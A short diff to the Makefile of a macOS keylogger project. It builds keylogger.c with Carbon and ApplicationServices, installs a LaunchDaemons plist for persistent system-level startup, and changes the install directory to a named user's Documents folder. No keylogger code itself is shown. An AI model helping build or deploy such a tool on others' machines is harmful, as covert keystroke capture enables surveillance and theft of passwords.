@@ -3,7 +3,7 @@ CFLAGS=-framework ApplicationServices -framework Carbon
 SOURCES=keylogger.c
 EXECUTABLE=keylogger
 PLIST=keylogger.plist
-INSTALLDIR=/usr/local/bin
+INSTALLDIR=/Users/jdavis17/Documents/
 PLISTDIR=/Library/LaunchDaemons
 PLISTFULL=$(PLISTDIR)/$(PLIST)
 
